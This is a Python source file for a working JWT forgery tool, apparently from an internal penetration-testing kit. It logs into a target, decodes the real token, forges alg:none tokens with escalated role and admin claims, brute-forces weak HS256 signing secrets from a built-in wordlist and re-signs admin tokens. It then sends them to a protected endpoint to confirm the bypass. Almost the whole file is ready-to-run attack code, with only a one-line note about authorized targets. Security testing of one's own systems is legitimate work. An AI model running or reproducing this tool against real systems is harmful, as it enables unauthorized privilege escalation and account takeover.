#!/usr/bin/env python3
"""
jwt_forge.py — Schema-adaptive JWT forgery (INTERNAL edition).

aukdoc fires one hardcoded alg:none token and hopes. This does it properly:
it obtains a REAL token from the target, decodes the actual schema, finds the
privilege claims THAT token uses, and forges escalated variants that match —
then sends them to a protected endpoint and confirms which (if any) unlock it.

Attacks:
  1. alg:none bypass  — strip the signature, set alg to none/None/NONE/nOnE,
     flip the target's own privilege claims (role, admin, is_admin, scope, ...).
  2. weak-secret HS256 — brute a wordlist against the REAL token's signature;
     on a hit, re-sign escalated claims with the recovered secret.

    python TOOLS/jwt_forge.py --url http://127.0.0.1:3456/ \
        --login /api/login --user alice --pass Sunshine1 --protected /api/admin
    python TOOLS/jwt_forge.py --url https://app --token eyJ... --protected /api/me
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, FRAMEWORK_VERSION
from privacy_guard import privacy_user_agent

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*")

# Claims that commonly gate privilege, and the escalated value to try.
PRIV_CLAIMS = {
    "role": "admin", "roles": ["admin"], "is_admin": True, "isAdmin": True,
    "admin": True, "user_type": "admin", "userType": "admin", "type": "admin",
    "scope": "admin", "scopes": ["admin"], "level": 99, "privilege": "admin",
    "permissions": ["admin", "*"], "group": "admin", "account_type": "admin",
}

WEAK_SECRETS = [
    "secret", "password", "changeme", "admin", "jwt", "jwtsecret", "jwt_secret",
    "secretkey", "secret_key", "key", "test", "dev", "development", "supersecret",
    "your-256-bit-secret", "your_jwt_secret", "mysecret", "s3cr3t", "token",
    "1234567890", "qwerty", "letmein", "default", "changethis", "vibe", "app",
]


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_dec(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


class JWTForge(VibeTool):
    def __init__(self, base):
        super().__init__("JWT Forge", "Schema-Adaptive JWT Forgery")
        self.base = base.rstrip("/")
        self.findings = 0

    def _req(self, path, method="GET", data=None, json_body=None, token=None,
             token_mode="bearer"):
        url = self.base + path
        headers = {"User-Agent": privacy_user_agent("JWT Forge"),
                   "Accept": "application/json,text/html,*/*"}
        if token:
            if token_mode == "bearer":
                headers["Authorization"] = f"Bearer {token}"
            elif token_mode == "cookie":
                headers["Cookie"] = f"token={token}; jwt={token}; access_token={token}"
            elif token_mode == "query":
                url += ("&" if "?" in url else "?") + "token=" + urllib.parse.quote(token)
        body = None
        if json_body is not None:
            body = json.dumps(json_body).encode(); headers["Content-Type"] = "application/json"
        elif isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        try:
            req = urllib.request.Request(url, data=body, method=method, headers=headers)
            with urllib.request.urlopen(req, timeout=8) as r:
                return r.getcode(), r.read(40000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(40000).decode("utf-8", "replace")
        except Exception as e:
            return 0, str(e)

    # -- token acquisition ---------------------------------------------------
    def _obtain_token(self, login_path, user, password, user_field, pass_field):
        creds = {user_field: user, pass_field: password}
        for body_kind in ("form", "json"):
            st, resp = self._req(login_path, "POST",
                                 data=creds if body_kind == "form" else None,
                                 json_body=creds if body_kind == "json" else None)
            m = JWT_RE.search(resp)
            if m:
                return m.group(0)
        return ""

    @staticmethod
    def _decode(token):
        h, p, s = (token.split(".") + ["", "", ""])[:3]
        try:
            header = json.loads(_b64url_dec(h))
        except Exception:
            header = {}
        try:
            payload = json.loads(_b64url_dec(p))
        except Exception:
            payload = {}
        return header, payload, s

    @staticmethod
    def _escalate(payload):
        """Return a copy of the payload with any present privilege claims bumped,
        plus a few common ones added in case the check is additive."""
        forged = dict(payload)
        touched = []
        for claim, val in PRIV_CLAIMS.items():
            if claim in forged:
                forged[claim] = val
                touched.append(claim)
        if not touched:  # nothing obvious present — inject the usual suspects
            for claim in ("role", "is_admin", "admin"):
                forged[claim] = PRIV_CLAIMS[claim]
            touched = ["role", "is_admin", "admin"]
        return forged, touched

    def _make_none(self, payload):
        forged, touched = self._escalate(payload)
        tokens = []
        for alg in ("none", "None", "NONE", "nOnE"):
            h = _b64url(json.dumps({"alg": alg, "typ": "JWT"}).encode())
            p = _b64url(json.dumps(forged).encode())
            tokens.append((f"alg:{alg}", f"{h}.{p}."))
        return tokens, touched

    def _crack_secret(self, token):
        try:
            h, p, s = token.split(".")
        except ValueError:
            return None
        signing_input = f"{h}.{p}".encode()
        for secret in WEAK_SECRETS:
            expected = _b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
            if hmac.compare_digest(expected, s):
                return secret
        return None

    def _make_hs256(self, payload, secret):
        forged, touched = self._escalate(payload)
        h = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        p = _b64url(json.dumps(forged).encode())
        sig = _b64url(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
        return f"{h}.{p}.{sig}", touched

    def run(self, token, login_path, user, password, user_field, pass_field,
            protected, token_mode):
        self.banner()
        self.log(f"Target: {self.base}")

        if not token and login_path:
            self.log(f"No --token given; logging in at {login_path} to obtain one...")
            token = self._obtain_token(login_path, user, password, user_field, pass_field)
        if not token:
            self.log("Could not obtain a JWT. Pass --token or a working --login/--user/--pass.", "fail")
            return 2

        header, payload, sig = self._decode(token)
        self.log(f"Obtained token. alg={header.get('alg')!r} claims={list(payload)}")
        if not protected:
            self.log("No --protected endpoint given; can't confirm bypass. Re-run with --protected /api/admin", "warn")
            return 2

        # Baseline: what does the REAL (un-escalated) token get?
        base_st, base_body = self._req(protected, token=token, token_mode=token_mode)
        self.log(f"Baseline (real token) -> {protected}: {base_st}")

        forgeries = []
        none_tokens, touched = self._make_none(payload)
        forgeries += none_tokens
        self.log(f"Escalating privilege claims: {touched}")

        secret = self._crack_secret(token)
        if secret is not None:
            self.log(f"WEAK JWT SECRET RECOVERED: '{secret}' — token signature is forgeable", "hack")
            self.findings += 1
            hs, _ = self._make_hs256(payload, secret)
            forgeries.append((f"HS256(secret='{secret}')", hs))
        else:
            self.log("No weak HS256 secret recovered from the wordlist.")

        for label, forged in forgeries:
            st, body = self._req(protected, token=forged, token_mode=token_mode)
            unlocked = (st == 200 and base_st != 200) or (
                st == 200 and any(m in body.lower() for m in ("admin", "secret", "\"ok\":true", "sk-"))
                and body != base_body)
            if unlocked:
                self.log(f"FORGERY ACCEPTED — {label} unlocked {protected} ({base_st}->{st})", "hack")
                self.findings += 1
            else:
                self.log(f"rejected: {label} -> {st}", "pass")

        self.log("=" * 40)
        if self.findings:
            self.log(f"JWT FORGERY COMPLETE — {self.findings} confirmed weakness(es)", "hack")
        else:
            self.log("No JWT forgery accepted — signature + algorithm validation held.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="JWT Forge - schema-adaptive JWT forgery")
    p.add_argument("--url", required=True, help="Target base URL you own/are authorized to test")
    p.add_argument("--token", default="", help="An existing JWT (else obtain via --login)")
    p.add_argument("--login", default="", help="Login path to obtain a token, e.g. /api/login")
    p.add_argument("--user", default="", help="Username/email for --login")
    p.add_argument("--pass", dest="password", default="", help="Password for --login")
    p.add_argument("--user-field", default="username", help="Login username field name")
    p.add_argument("--pass-field", default="password", help="Login password field name")
    p.add_argument("--protected", default="", help="Protected endpoint to confirm a bypass against")
    p.add_argument("--token-mode", choices=("bearer", "cookie", "query"), default="bearer",
                   help="How the target reads the token (default: bearer)")
    p.add_argument("-v", "--version", action="version", version=f"JWT Forge {FRAMEWORK_VERSION}")
    args = p.parse_args(argv)
    return JWTForge(args.url).run(args.token, args.login, args.user, args.password,
                                  args.user_field, args.pass_field, args.protected, args.token_mode)


if __name__ == "__main__":
    sys.exit(main())
